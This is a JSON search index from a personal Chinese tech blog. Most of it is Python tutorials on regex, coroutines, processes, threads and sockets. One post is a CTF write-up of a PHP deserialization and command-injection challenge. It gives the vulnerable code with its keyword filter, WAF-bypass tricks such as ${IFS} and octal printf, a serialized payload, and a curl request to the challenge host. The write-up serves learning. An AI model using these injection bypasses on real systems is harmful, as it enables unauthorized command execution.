{"meta":{"title":"夏了茶糜","subtitle":"","description":"","author":"夏了茶糜","url":"https://xin02.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2022-07-01T12:29:49.874Z","updated":"2022-07-01T12:29:49.872Z","comments":false,"path":"/404.html","permalink":"https://xin02.github.io/404.html","excerpt":"","text":""},{"title":"分类","date":"2022-07-01T12:29:49.527Z","updated":"2022-07-01T12:29:49.526Z","comments":false,"path":"categories/index.html","permalink":"https://xin02.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-07-01T12:29:49.410Z","updated":"2022-07-01T12:29:49.408Z","comments":false,"path":"tags/index.html","permalink":"https://xin02.github.io/tags/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-07-01T12:29:49.837Z","updated":"2022-07-01T12:29:49.834Z","comments":false,"path":"about/index.html","permalink":"https://xin02.github.io/about/index.html","excerpt":"","text":"如果对本博客文章有任何疑问，可发送邮件至 sxin0807#qq.com (#替换为@即为邮箱地址)与我讨论。"},{"title":"友情链接","date":"2022-07-01T12:29:49.636Z","updated":"2022-07-01T12:29:49.634Z","comments":true,"path":"links/index.html","permalink":"https://xin02.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"unseping","slug":"unseping","date":"2022-11-06T12:10:23.000Z","updated":"2022-11-06T13:34:29.378Z","comments":true,"path":"2022/11/06/unseping/","link":"","permalink":"https://xin02.github.io/2022/11/06/unseping/","excerpt":"","text":"1、题目源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phphighlight_file(__FILE__);class ease&#123; private $method;//ping private $args;//array(&#x27;&#x27;) function __construct($method, $args) &#123;//创建对象时触发 $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __destruct()&#123;//对象销毁时触发 if (in_array($this-&gt;method, array(&quot;ping&quot;))) &#123;//如果ping匹配数组里有ping进入if //这个决定了 $a = new ease(&quot;ping&quot;,array(&#x27;pwd&#x27;));的第一个参数ping //下面的函数也决定了第二个参数是 数组型array(&#x27;&#x27;) call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); //调用回调函数，并把一个数组参数作为回调函数的参数 //被调用的函数 this之这个类 method 就是函数ping 参数是args //只针对php // call_user_func_array(array($ease,&quot;ping&quot;),array(&#x27;one&#x27;)); &#125; &#125; function ping($ip)&#123;//等于执行了ping(&quot;one&quot;) //ping的参数只有一个因此数组传一个参就好了 exec($ip, $result); var_dump($result);//貌似执行了这个$ip命令返回了结果 &#125; function waf($str)&#123; if (!preg_match_all(&quot;/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/&quot;, $str, $pat_array)) &#123; //正则表达式()整体修饰|或&amp;或;或 或/或cat或flag或tac或php或ls 这都是liunx常用的一些执行命令 return $str;//绕过表达式 返回传参 &#125; else &#123; echo &quot;don&#x27;t hack&quot;; &#125; &#125; function __wakeup()&#123;//执行unserialize()时，先会调用这个函数 foreach($this-&gt;args as $k =&gt; $v) &#123;//遍历关联数组 foreach ($array as $key =&gt; $value) $this-&gt;args[$k] = $this-&gt;waf($v);//调用waf函数输入$v //若果绕过waf本身的args不会变 &#125; &#125; &#125;$ctf=@$_POST[&#x27;ctf&#x27;];//post传参ctf=xxxx@unserialize(base64_decode($ctf));//先对ctf进行base64解密 在反序列话//unserialize先检查__wakeup()存在的意义：常常初始化操作 或 连接数据库/*(前提：有可利用的类）常见的魔术方法__construct() //创建对象时触发__destruct() //对象销毁时触发__call() //在对象中调用不可访问的方法时触发__callStatic() //在静态中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数*/?&gt; 2、函数解释highlight_filehighlight_file(filename,return) 函数对文件进行语法高亮显示。 参数 描述 filename 必需。要进行高亮处理的 PHP 文件的路径。 return 可选。如果设置 true，则本函数返回高亮处理的代码。 __FILE__PHP中__FILE__是一个魔术常量，它会返回当前执行PHP脚本的完整路径和文件名。自PHP 4.0.2版本起，它总是包含一个绝对路径。 __construct()构造函数（constructor method，也称为构造器）是类中的一种特殊函数，当使用 new 关键字实例化一个对象时，构造函数将会自动调用。 在 PHP3.0 和 PHP4.0 中，构造函数是一个与其所在类同名的函数。而在 PHP5 中，虽然也支持 PHP3.0 和 PHP4.0 中的用法，但是更推荐使用__construct作为类的构造函数，这样做的好处就是构造函数无需随着类名的改变而做出修改。在 PHP7.0 中废弃了 PHP3.0 和 PHP4.0 中的用法，构造函数必须使用__construct来定义。 构造函数就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。和普通函数类似构造函数也可以带有参数，如果构造函数有参数的话，那么在实例化也需要传入对应的参数。 __destruct()析构函数的作用和构造函数正好相反，析构函数只有在对象被垃圾收集器收集前（即对象从内存中删除之前）才会被自动调用。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。 在 PHP 中有一种垃圾回收机制，当对象不能被访问时就会自动启动垃圾回收机制，收回对象占用的内存空间。而析构函数正是在垃圾回收机制回收对象之前调用的。 析构函数的声明格式与构造函数相似，在类中声明析构函数的名称也是固定的，同样以两个下画线开头的方法名__destruct()，而且析构函数不能带有任何参数。 __sleep__sleep()，执行serialize()时，先会调用这个函数 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。 此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 注意：__sleep() 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。可以用 Serializable 接口来替代。 作用：__sleep() 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 __wakeup执行unserialize()时，先会调用这个函数 如果说__sleep 是白的，那么__wakeup() 就是黑的了。 那么为什么呢？ 因为：与之相反，unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 作用： __wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作 in_array(value,array,type)参数说明： value ：要搜索的值 array ： 被搜索的数组 type ： 类型，true全等 ，false非全等(默认) PHP 4, PHP 5中 in_array函数功能 – 检查数组中是否存在某个值。 call_user_func_array(PHP 4 &gt;= 4.0.4, PHP 5, PHP 7, PHP 8) call_user_func_array — 调用回调函数，并把一个数组参数作为回调函数的参数 把第一个参数作为回调函数（callback）调用，把参数数组作（args）为回调函数的的参数传入。 参数 ¶ callback 被调用的回调函数。 args 要被传入回调函数的数组，这个数组得是索引数组。 返回值 ¶ 返回回调函数的结果。如果出错的话就返回 false 。 serialize()serialize() 函数用于序列化对象或数组，并返回一个字符串。 serialize() 函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 如果想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。 PHP 版本要求: PHP 4, PHP 5, PHP 7 语法 1string serialize ( mixed $value ) 参数说明： $value: 要序列化的对象或数组。 返回值:返回一个字符串。 unserialize()用于将通过 serialize() 函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 PHP 版本要求: PHP 4, PHP 5, PHP 7 参数说明： $str: 序列化后的字符串。 返回值: 返回的是转换之后的值，可为 integer、float、string、array 或 object。如果传递的字符串不可解序列化，则返回 FALSE，并产生一个 E_NOTICE。 3、解题方法代码过滤了flag，ls，空格等。可以使用反斜杠隔开ls，反斜杠在Linux中可以作为转义符号或作为换行符，也可通过Linux shell脚本中的空的环境变量绕过例如将${a}放在ls中间，${IFS}代替空格。还可以通过将字符转换为8进制的ASCII码绕过检测。例如：$(printf “\\154\\163”)，154为l，163为s 12345┌──(root㉿kali)-[/]└─# $(printf &quot;\\154\\163&quot;)bin etc initrd.img lib32 lost+found opt run sys varboot flag initrd.img.old lib64 media proc sbin tmp vmlinuzdev home lib libx32 mnt root srv usr vmlinuz.old 123456789┌──(root㉿kali)-[~]└─# ls -l\\a \\/home总用量 12drwxr-xr-x 3 root root 4096 2月 28 2022 .drwxr-xr-x 19 root root 4096 9月 1 09:23 ..drwxr-xr-x 17 kk kk 4096 2月 28 2022 kk 1echo base64_encode(serialize(new ease(&quot;ping&quot;,array(&quot;l\\s fl\\ag_1\\s_here&quot;)))); 输出为：Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxOToibFxzCQlmbFxhZ18xXHNfaGVyZSI7fX0 通过curl发送post数据 1curl http://61.147.171.105:51434/ -X POST -d &#x27;ctf=Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxOToibFxzCQlmbFxhZ18xXHNfaGVyZSI7fX0&#x27; 江苏工匠杯_unseping_wp_昵称还在想呢的博客-CSDN博客 GXYCTF2019–Ping Ping Ping_FTOrange的博客-CSDN博客 shell命令之 IFS(内部分隔符的用法)h0ld1rs的博客-CSDN博客$ifs$1 PHP反序列化漏洞简介及相关技巧小结 - FreeBuf网络安全行业门户 CTF中PHP反序列化和命令注入的一次简单利用 | payload (lmlphp.com)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xin02.github.io/categories/CTF/"}],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://xin02.github.io/tags/WEB/"},{"name":"反序列化","slug":"反序列化","permalink":"https://xin02.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Python3 面向对象","slug":"Python3-面向对象","date":"2022-07-11T06:10:46.000Z","updated":"2022-07-11T06:12:24.933Z","comments":true,"path":"2022/07/11/Python3-面向对象/","link":"","permalink":"https://xin02.github.io/2022/07/11/Python3-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/","excerpt":"","text":"","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"https://xin02.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"}]},{"title":"Python3 正则","slug":"Python3-正则表达式","date":"2021-08-09T02:36:23.000Z","updated":"2022-07-01T12:29:49.108Z","comments":true,"path":"2021/08/09/Python3-正则表达式/","link":"","permalink":"https://xin02.github.io/2021/08/09/Python3-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"正则表达式 - 简介典型的搜索和替换操作要求您提供与预期的搜索结果匹配的确切文本。虽然这种技术对于对静态文本执行简单搜索和替换任务可能已经足够了，但它缺乏灵活性，若采用这种方法搜索动态文本，即使不是不可能，至少也会变得很困难。 通过使用正则表达式，可以： 测试字符串内的模式。 例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。 替换文本。 可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。 基于模式匹配从字符串中提取子字符串。 可以查找文档内或输入域内特定的文本。 例如，您可能需要搜索整个网站，删除过时的材料，以及替换某些 HTML 格式标记。在这种情况下，可以使用正则表达式来确定在每个文件中是否出现该材料或该 HTML 格式标记。此过程将受影响的文件列表缩小到包含需要删除或更改的材料的那些文件。然后可以使用正则表达式来删除过时的材料。最后，可以使用正则表达式来搜索和替换标记。 匹配单个字符匹配多个字符匹配开头结尾匹配分组Python3 Re模块高级用法","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"正则表达式","slug":"正则表达式","permalink":"https://xin02.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"}]},{"title":"Python3 协程","slug":"Python3-协程","date":"2021-06-18T01:18:14.000Z","updated":"2022-07-01T12:29:49.200Z","comments":true,"path":"2021/06/18/Python3-协程/","link":"","permalink":"https://xin02.github.io/2021/06/18/Python3-%E5%8D%8F%E7%A8%8B/","excerpt":"","text":"迭代是访问集合元素的一种方式。迭代器是一个可以记住遍历的位置的对象。迭代器对象从集合的第一个元素开始访问，直到所有元素被访问完结束。迭代器只能往前不会后退。 判断是否可迭代12345678910In [1]: from collections.abc import IterableIn [2]: isinstance(&quot;abc&quot;,Iterable)Out[2]: TrueIn [3]: isinstance([1,2,3],Iterable)Out[3]: TrueIn [4]: isinstance(123,Iterable)Out[4]: False 返回为True即为可迭代 迭代器12345678910111213141516171819202122class Classmate(object): def __init__(self): self.names = list() self.current_num = 0 def add(self,name): self.names.append(name) def __iter__(self): #如果想要一个对象 可以迭代，即可以使用for，那么必须实现__iter__方法 return self def __next__(self): if self.current_num &lt; len(self.names): ret = self.names[self.current_num] self.current_num += 1 return ret else: raise StopIterationclassmate = Classmate()classmate.add(&quot;小1&quot;)classmate.add(&quot;小2&quot;)classmate.add(&quot;小3&quot;)for i in classmate: print(i) 迭代器的应用(斐波那契数列)1234567891011121314151617181920class Fibonacci(object): def __init__(self,max_num): self.max_num = max_num self.current_num = 0 self.front = 0 self.after = 1 def __iter__(self): return self def __next__(self): if self.current_num &lt; self.max_num: ret = self.front self.front, self.after = self.after, (self.front + self.after) self.current_num += 1 return ret else: raise StopIterationfibo = Fibonacci(20)for num in fibo: print(num) 迭代器的其他使用方法并不是只有for循环能够接受可迭代对象，除for循环外，list、tuple等也能接受。 123a = (11,22,33)list(a)#此处list(a)不是单纯的类型转换，而是首先创建一个空列表，然后调用next方法，一个一个的往列表中添加。 生成器生成器是一种特殊的迭代器 创建生成器方法1123456789In [1]: nums = [x*2 for x in range(5)]In [2]: numsOut[2]: [0, 2, 4, 6, 8]In [3]: nums = (x*2 for x in range(5))In [4]: numsOut[4]: &lt;generator object &lt;genexpr&gt; at 0x000001DC00D7AF20&gt; 方法2如果一个函数中，存在yield语句，那么它就不是一个函数而是一个生成器 1234567891011def create_num(all_num): a, b, current_num = 0, 1, 0 while current_num &lt; all_num: yield a a, b = b, a + b current_num += 1generator = create_num(100)#generator就是一个生成器对象for num in generator: print(num) 生成器也是一个特殊的迭代器(使用next函数访问)123456789101112131415def create_num(all_num): a, b, current_num = 0, 1, 0 while current_num &lt; all_num: yield a a, b = b, a + b current_num += 1 return &quot;ok ...&quot;generator = create_num(100)for i in range(102): try: print(next(generator)) except StopIteration as e: print(e.value) break send唤醒send与next的区别，send可以向生成器中传参 123456789101112def create_num(all_num): a, b, current_num = 0, 1, 0 while current_num &lt; all_num: ret = yield a print(ret) a, b = b, a + b current_num += 1 return &quot;ok ...&quot;generator = create_num(100)print(next(generator))print(generator.send(&quot;传参&quot;)) 第一次启动生成器，如果使用send，不能传值。第一次建议使用next，非要使用send，可以传入None这个空值。 使用yield完成多任务1234567891011121314151617181920212223import timedef task_1(): while True: print(&quot;---1---&quot;) time.sleep(0.1) yielddef task_2(): while True: print(&quot;---2---&quot;) time.sleep(0.1) yielddef main(): t1 = task_1() t2 = task_2() while True: next(t1) next(t2)if __name__ == &quot;__main__&quot;: main() 使用greenlet完成多任务安装greenlet 1pip install greenlet greenlet 12345678910111213141516171819import timefrom greenlet import greenletdef test1(): while True: print(&quot;---A---&quot;) gr2.switch() time.sleep(0.5)def test2(): while True: print(&quot;---B---&quot;) gr1.switch() time.sleep(0.5)gr1 = greenlet(test1)gr2 = greenlet(test2)gr1.switch() greenlet已经实现了协程，但是还需要人工切换。gevent可以自动切换 使用gevent完成多任务安装gevent 1pip install gevent 简单实现 123456789101112131415import geventdef f(n): for i in range(n): print(gevent.getcurrent(),i) #只有使用gevent.sleep才会切换 gevent.sleep(1)g1 = gevent.spawn(f,5)g2 = gevent.spawn(f,5)g3 = gevent.spawn(f,5)g1.join()g2.join()g3.join() 给程序打补丁monkey.patch_all() 1234567891011121314151617181920import geventfrom gevent import monkeyimport timemonkey.patch_all()#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块def f(n): for i in range(n): print(gevent.getcurrent(),i) #只有使用gevent.sleep才会切换 time.sleep(1)g1 = gevent.spawn(f,5)g2 = gevent.spawn(f,5)g3 = gevent.spawn(f,5)g1.join()g2.join()g3.join() 简洁写法 1234567891011121314import geventfrom gevent import monkeyimport timemonkey.patch_all()#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块def f(n): for i in range(n): print(gevent.getcurrent(),i) #只有使用gevent.sleep才会切换 time.sleep(1)gevent.joinall([gevent.spawn(f,5),gevent.spawn(f,5),gevent.spawn(f,5)]) 案例-图片下载器（利用协程提高速度）1234567891011121314151617181920import geventfrom gevent import monkeyimport urllib.requestmonkey.patch_all()#monkey.patch_all()给程序打补丁，程序当遇到耗时的代码，会换为gevent中自己实现的模块def download_img(url): req = urllib.request.urlopen(url) with open(url[-8:],&#x27;wb&#x27;) as file: file.write(req.read())def main(): gevent.joinall([ gevent.spawn(download_img,&quot;https://assets.ubuntu.com/v1/3887354e-CVE-Priority-icon-High.svg&quot;), gevent.spawn(download_img,&quot;https://www.venustech.com.cn/u/cms/www/202106/11174004guxu.png&quot;), gevent.spawn(download_img,&quot;https://www.baidu.com/img/flexible/logo/pc/result.png&quot;)])if __name__ == &quot;__main__&quot;: main() 进程、线程、协程对比 进程是资源分配的单位 线程是操作系统调度的单位 进程切换需要的资源很大，效率很低 线程切换需要的资源一般，效率一般（不考虑GIL情况下） 协程切换任务资源很小，效率高 多进程、多线程根据CPU核数不一样可能是并行，但是协程是在一个线程中 所以是并发","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"协程","slug":"协程","permalink":"https://xin02.github.io/tags/%E5%8D%8F%E7%A8%8B/"}]},{"title":"Python3 多进程","slug":"Python3-多进程","date":"2021-06-16T06:38:14.000Z","updated":"2022-07-01T12:29:49.315Z","comments":true,"path":"2021/06/16/Python3-多进程/","link":"","permalink":"https://xin02.github.io/2021/06/16/Python3-%E5%A4%9A%E8%BF%9B%E7%A8%8B/","excerpt":"","text":"什么是进程？ 程序：一个未运行的二进制文件，叫做程序。如Windows下的PE文件 进程：二进制文件运行后，文件本身以及用到的资源称为进程，他是操作系统分配资源的基本单元。 多任务：不止可以通过线程完成多任务，还可以通过进程完成多任务。 使用Process实现多进程123456789101112131415from multiprocessing import Processimport timedef test(test): time.sleep(5) print(&quot;这是&#123;&#125;&quot;.format(test))def main(): p1 = Process(target=test,kwargs=&#123;&quot;test&quot;:&quot;t1&quot;&#125;) p2 = Process(target=test,kwargs=&#123;&quot;test&quot;:&quot;t2&quot;&#125;) p1.start() p2.start()if __name__ == &quot;__main__&quot;: main() 通过队列完成进程间通信12345678910111213141516171819202122232425262728293031from multiprocessing import Queue,Processimport timeimport osdef queue_put(q): for i in range(10): q.put(i) print(&quot;PID:&#123;&#125; ,&#123;&#125; 已存入队列，当前队列共&#123;&#125;个元素&quot;.format(os.getpid(),i,q.qsize())) time.sleep(5)def queue_get(q): for i in range(10): print(&quot;PID:&#123;&#125; ,&#123;&#125; 已取出队列，当前队列共&#123;&#125;个元素&quot;.format(os.getpid(),q.get(),q.qsize())) time.sleep(5)def main(): q = Queue(5)#创建一个队列，队列可以存储5个数据 # q.put(&quot;a&quot;)#向队列中添加数据，如果队列存满，程序会阻塞等待 # q.get()#从队列中获取数据，如果队列为空，程序会阻塞等待 # #q.put_nowait()如果队列存满，程序会报异常 # #q.get_nowait()如果队列为空，程序会报异常 # q.qsize()#取出队列中数据个数 # q.empty()#判断队列是否为空 # q.full()#判断队列是否存满 p1 = Process(target=queue_put,args=(q,)) p2 = Process(target=queue_get,args=(q,)) p1.start() p2.start()if __name__ == &quot;__main__&quot;: main() 进程池12345678910111213141516import hashlibfrom multiprocessing import Pooldef js_hash(s): md5 = hashlib.md5() md5.update(s.encode(&#x27;utf-8&#x27;)) md5 = md5.hexdigest() if &#x27;0e&#x27; == md5[0:2] and md5[2:].isdecimal(): print(s,md5)if __name__ == &#x27;__main__&#x27;: p = Pool(5)#创建一个进程池，最大进程数5 for i in range(0,99999999999999): s = &#x27;0e&#x27; + str(i) p.apply_async(js_hash, args=(s,))#apply_async(要调用的目标,args=(传递的参数,)) p.close()#关闭进程池，关闭后进程池不再接受新的请求 p.join()#等待所有子进程执行完毕，必须放在close语句后 案例：多任务文件copy12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import os,sysfrom multiprocessing import Pool,Managerdef copy_file(q,file_name,old_dir,new_dir): #print(&quot;将 &#123;&#125; 文件复制到 &#123;&#125; 目录下&quot;.format(file_name,new_dir)) if os.path.isdir(old_dir + &quot;\\\\&quot; + file_name): # print(file_name,&quot;是个目录&quot;) q.put(file_name) else: #print(file_name,&quot;是个文件&quot;) with open(old_dir + &quot;\\\\&quot; + file_name,&#x27;rb&#x27;) as file: with open(new_dir + &quot;\\\\&quot; + file_name,&quot;wb&quot;) as file_new: file_new.write(file.read())def main(): # 1、获取要拷贝的文件名 print(&quot;注意！此程序不完善，尚不能copy文件夹中文件夹的文件&quot;) old_dir = input(r&quot;输入需要copy的源文件夹路径,如(C:\\null):&quot;) # 2、创建新文件夹 new_dir = input(r&quot;输入需要copy的目标文件夹路径,如(C:\\null_副件):&quot;) try: os.mkdir(new_dir) except: pass # 3、获取所有需要copy文件名 files_name = os.listdir(old_dir) # 4、创建进程池 po = Pool(5) # 进程池使用队列需要使用Manager类下的Queue q = Manager().Queue() # 5、向进程池添加复制文件的任务 for file_name in files_name: po.apply_async(copy_file,args=(q,file_name,old_dir,new_dir)) po.close() #po.join() copy_ok = 0 copy_num = len(files_name) folders = [] while True: copy_ok += 1 sys.stdout.write(&quot;\\r拷贝进度:&#123;:.2f&#125;%&quot;.format(copy_ok*100/copy_num)) try: folders.append(q.get_nowait()) except: pass #将未拷贝的文件夹存入列表 if copy_ok &gt;= copy_num: break print(&quot;\\n以下文件夹未复制:&quot;,&quot;,&quot;.join(folders)) if __name__ == &quot;__main__&quot;: main() 参考:multiprocessing — 基于进程的并行 — Python 3.9.5 文档","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"多进程","slug":"多进程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E8%BF%9B%E7%A8%8B/"},{"name":"队列","slug":"队列","permalink":"https://xin02.github.io/tags/%E9%98%9F%E5%88%97/"},{"name":"进程池","slug":"进程池","permalink":"https://xin02.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B1%A0/"}]},{"title":"Python3 多线程","slug":"Python3-多线程","date":"2021-06-05T12:28:00.000Z","updated":"2022-07-01T12:29:49.232Z","comments":true,"path":"2021/06/05/Python3-多线程/","link":"","permalink":"https://xin02.github.io/2021/06/05/Python3-%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"简单实现多线程123456789101112131415161718192021import threadingimport timedef sing(sing): for i in range(5): print(&quot;---sing()---&#123;&#125;&quot;.format(sing)) time.sleep(1)def dance(dance): for i in range(5): print(&quot;---dance()---&#123;&#125;&quot;.format(dance)) time.sleep(1)def main(): t1 = threading.Thread(target=sing,args=(&quot;t1&quot;,)) t2 = threading.Thread(target=dance,args=(&quot;t2&quot;,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() 多线程互斥锁123456789101112131415161718192021222324252627282930313233343536373839import threadingimport timeA = 2lock = threading.Lock()#创建一个互斥锁def sing(sing): global A for i in range(500000): lock.acquire() #加锁 A += 1 lock.release() #解锁 print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(sing,i))def dance(dance): global A for i in range(500000): lock.acquire() #加锁 A -= 1 lock.release() #解锁 print(&#x27;&#123;&#125;:&#123;&#125;&#x27;.format(dance,i))def main(): global A t1 = threading.Thread(target=sing,args=(&quot;t1&quot;,)) t2 = threading.Thread(target=dance,args=(&quot;t2&quot;,)) t1.start() t2.start() t1.join() t2.join() print(A)if __name__ == &quot;__main__&quot;: main() 查看线程数量使用 1threading.enumerate() 获取当前所有线程。 此处打印出一个列表，列表中共有3个线程信息。一个是主线程，另外两个是子线程 这里需要注意，我们需要在代码中使用join()方法来阻塞主线程。当所有阻塞的子线程执行完毕后，才会继续执行主线程。 通过继承Thread类，重写run方法实现多线程1234567891011121314151617181920212223242526272829303132333435363738394041import threadingimport timeA = 2lock = threading.Lock()#创建一个互斥锁class my_thread(threading.Thread): def run(self) -&gt; None: self.sing() def sing(self): global A if self._kwargs[&#x27;mothed&#x27;] == &#x27;add&#x27;: tmp = 1 elif self._kwargs[&#x27;mothed&#x27;] == &#x27;del&#x27;: tmp = -1 else: tmp = 1 for i in range(50): lock.acquire() #加锁 A += tmp lock.release() #解锁 print(&#x27;&#123;&#125;:&#123;&#125;:&#123;&#125;&#x27;.format(self._kwargs[&#x27;cs&#x27;],i,A))def main(): global A t1 = my_thread(kwargs=&#123;&#x27;cs&#x27;:&#x27;sing&#x27;,&#x27;mothed&#x27;:&#x27;add&#x27;&#125;,name=&quot;T1&quot;) t2 = my_thread(kwargs=&#123;&#x27;cs&#x27;:&#x27;dance&#x27;,&#x27;mothed&#x27;:&#x27;del&#x27;&#125;,name=&quot;T2&quot;) t1.start() t2.start() print(threading.enumerate()) print(A) t1.join() t2.join() print(A)if __name__ == &quot;__main__&quot;: main() 多线程UDP聊天器12345678910111213141516171819202122232425262728293031323334353637import threadingimport socketclass my_thread(threading.Thread): def run(self) -&gt; None: if self._kwargs[&#x27;mothed&#x27;] == &#x27;recv_message&#x27;: self.recv_message() elif self._kwargs[&#x27;mothed&#x27;] == &#x27;send_message&#x27;: self.send_message() def send_message(self): while True: try: ip = input(&quot;目标IP:&quot;) port = int(input(&quot;目标端口:&quot;)) msg = input(&quot;发送的消息:&quot;).encode(&#x27;utf-8&#x27;) except: continue self._kwargs[&#x27;udp_socket&#x27;].sendto(msg,(ip,port)) def recv_message(self): while True: data,client_addr = self._kwargs[&#x27;udp_socket&#x27;].recvfrom(1024) print(&#x27;source:&#x27;, client_addr,&#x27;收到的数据：&#x27;, data.decode(&quot;UTF-8&quot;))def main(): udp_socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) udp_socket.bind((&quot;&quot;,20216)) recv_message = my_thread(kwargs=&#123;&#x27;udp_socket&#x27;:udp_socket,&#x27;mothed&#x27;:&#x27;recv_message&#x27;&#125;,name=&quot;recv_message&quot;) send_message = my_thread(kwargs=&#123;&#x27;udp_socket&#x27;:udp_socket,&#x27;mothed&#x27;:&#x27;send_message&#x27;&#125;,name=&quot;send_message&quot;) recv_message.start() send_message.start() recv_message.join() send_message.join()if __name__ == &quot;__main__&quot;: main()","categories":[{"name":"Python3","slug":"Python3","permalink":"https://xin02.github.io/categories/Python3/"}],"tags":[{"name":"多线程","slug":"多线程","permalink":"https://xin02.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"互斥锁","slug":"互斥锁","permalink":"https://xin02.github.io/tags/%E4%BA%92%E6%96%A5%E9%94%81/"}]},{"title":"Python3 网络编程（使用Socket实现TCP、UDP通信）","slug":"Python3-网络编程（使用Socket实现TCP、UDP通信）","date":"2021-06-04T05:08:00.000Z","updated":"2022-07-01T12:29:49.109Z","comments":true,"path":"2021/06/04/Python3-网络编程（使用Socket实现TCP、UDP通信）/","link":"","permalink":"https://xin02.github.io/2021/06/04/Python3-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%88%E4%BD%BF%E7%94%A8Socket%E5%AE%9E%E7%8E%B0TCP%E3%80%81UDP%E9%80%9A%E4%BF%A1%EF%BC%89/","excerpt":"","text":"TCP通信TCP_服务端123456789101112 1 import socket as s 2 3 tcp = s.socket(s.AF_INET,s.SOCK_STREAM) 4 tcp.bind((&#x27;127.0.0.1&#x27;, 6666)) 5 tcp.listen(5) 6 while True: 7 # 建立客户端连接 8 clientsocket,addr = tcp.accept() 9 print(&quot;连接地址: %s&quot; % str(addr))10 msg = &#x27;欢迎访问&#123;&#125;！&#x27;.format(tcp.getsockname())+ &quot;\\r\\n&quot;11 clientsocket.send(msg.encode(&#x27;utf-8&#x27;))12 clientsocket.close() TCP_客户端1234567import socket as stcp = s.socket(s.AF_INET,s.SOCK_STREAM)tcp.connect((&#x27;127.0.0.1&#x27;, 6666))msg = tcp.recv(1024)tcp.close()print (msg.decode(&#x27;utf-8&#x27;)) UDP通信UDP_服务端1234567891011import socketBUFSIZE = 1024ip_port = (&#x27;127.0.0.1&#x27;, 9999)server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # udp协议server.bind(ip_port)while True: data,client_addr = server.recvfrom(BUFSIZE) print(&#x27;client地址：&#x27;, client_addr,&#x27;server收到的数据：&#x27;, data.decode(&quot;UTF-8&quot;)) server.sendto(data,client_addr)server.close() UDP_客户端12345678910111213import socketBUFSIZE = 1024client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)while True: msg = input(&quot;&gt;&gt;&quot;).strip() ip_port = (&#x27;127.0.0.1&#x27;, 9999) client.sendto(msg.encode(&#x27;utf-8&#x27;),ip_port) data,server_addr = client.recvfrom(BUFSIZE) print(server_addr,&#x27;服务端收到: 